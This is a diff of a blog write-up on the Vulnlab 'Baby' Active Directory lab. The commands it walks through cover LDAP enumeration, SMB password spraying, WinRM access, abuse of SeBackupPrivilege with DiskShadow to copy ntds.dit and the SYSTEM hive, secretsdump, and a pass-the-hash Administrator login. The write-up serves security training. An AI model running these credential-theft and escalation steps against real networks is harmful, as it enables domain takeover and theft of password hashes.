@@ -8,6 +8,7 @@ image: "https://images-ext-1.discordapp.net/external/iTsNgpEcu1U88J1FvpyBi4VwhZZ
 ---
 
 ## Intoduction
+
 In this write-up, I’ll walk you through the Active Directory lab "Baby" from Vulnlab, a solo Windows machine designed for junior-level users exploring Active Directory exploitation. The lab focuses on two fundamental techniques: LDAP enumeration, which involves querying the domain for information about users, groups, and other AD objects, and Windows privilege escalation through the abuse of SeBackupPrivilege, a misconfigured right that can be leveraged to gain SYSTEM-level access. 
 
 ## Scanning
@@ -101,6 +102,7 @@ ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectCla
 ### SMB
 
 **SMB Password Spray**
+
 With the list of users gathered from LDAP and a password (`BabyStart123!`), I attempted a password spray attack using `nxc (nextExec)` over `SMB` to see if the credentials worked for any of the accounts. This approach tests one password across multiple usernames to `avoid account lockouts`.
 The spray resulted in a successful hit, but the response indicated `STATUS_PASSWORD_MUST_CHANGE`.This means the account is valid and the credentials are correct, but the user is forced to change the password on first login, a common situation for service accounts or newly created users.
 
@@ -131,13 +133,12 @@ nxc smb 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!' --users
 
 
 ## Initial Access
+
 With the credentials for Caroline.Robinson confirmed and no further password restrictions, I attempted to gain a shell on the target using WinRM (Windows Remote Management). First, I tested connectivity using nxc to confirm WinRM was accessible with the current credentials:
 
 ```bash
 nxc winrm 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!'
 ```
-
-![alt text](/assets/screenshots/baby/9.png)
 
 ```bash
 evil-winrm -i 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!'
@@ -156,17 +157,24 @@ To identify potential privilege escalation paths, I used BloodHound via the bloo
 ```bash
 bloodhound-python -d baby.vl  -c all -u 'Caroline.Robinson' -p 'NewSecurePass123!'  -ns 10.10.116.106 --zip
 ```
+![alt text](/assets/screenshots/baby/9.png)
+
 
 ![alt text](/assets/screenshots/baby/7.png)
 
 **First Degree Group Membership**
- I noticed that the user Caroline.Robinson was a first-degree group member of Backup Operators, a built-in Windows group with special privileges. To confirm this manually, I checked the user privileges directly from the shell.The output confirmed that the user indeed had the SeBackupPrivilege assigned — a powerful privilege that can be abused to read arbitrary files, including the registry or even the NTDS.dit file, by backing them up and extracting sensitive data like hashes.
+
+I noticed that the user Caroline.Robinson was a first-degree group member of Backup Operators, a built-in Windows group with special privileges. To confirm this manually, I checked the user privileges directly from the shell.The output confirmed that the user indeed had the SeBackupPrivilege assigned — a powerful privilege that can be abused to read arbitrary files, including the registry or even the NTDS.dit file, by backing them up and extracting sensitive data like hashes.
 
 ![alt text](/assets/screenshots/baby/8.png)
 
 ![alt text](/assets/screenshots/baby/11.png)
 
-vss.dsh
+**Abusing SeBackupPrivilege**
+
+With SeBackupPrivilege confirmed, I proceeded to abuse it using DiskShadow to create a Volume Shadow Copy and extract sensitive files like `ntds.dit` (which contains password hashes) and the `SYSTEM` registry hive (needed to decrypt the hashes).
+
+I created a vss.dsh script with the following content:
 
 ```bash
 set context persistent nowriters
@@ -185,7 +193,9 @@ diskshadow /s vss.dsh
 
 ![alt text](/assets/screenshots/baby/13.png)
 
-Copying
+**Volume Shadow Copy**
+
+This successfully mounted the shadow copy to the Z: drive. I was then able to copy the sensitive files using robocopy and reg.exe:
 
 ```bash
 robocopy /b z:\windows\ntds . ntds.dit
@@ -199,11 +209,15 @@ also
 reg.exe save hklm\system system
 ```
 
-download
+**Transferring Files**
+
+Once both the `ntds.dit` and `system` hive files were obtained, I used `evil-winrm` `upload/download` functionality to exfiltrate them for offline secrets dumping:
 
 ![alt text](/assets/screenshots/baby/15.png)
 
-Dump secrets
+**Dumping Secrets**
+
+With both the `ntds.dit` and `system` hive files successfully extracted, I used `Impacket secretsdump`.py to extract hashes.
 
 ```bash
 secretsdump.py -system system -ntds ntds.dit local
@@ -211,10 +225,19 @@ secretsdump.py -system system -ntds ntds.dit local
 
 ![alt text](/assets/screenshots/baby/16.png)
 
-Access as administrator
+**Pass-the-Hash(PtH)**
+
+Instead of cracking the hash, I performed a `Pass-the-Hash (PtH)` attack using `evil-winrm`, which allows authentication directly with the `NTLM` hash:
 
 ```bash
 evil-winrm -i 10.10.89.186 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
 ```
 
 ![alt text](/assets/screenshots/baby/17.png)
+
+## References
+
+[NetExec Cheatsheet](https://seriotonctf.github.io/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/)
+
+[Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
+
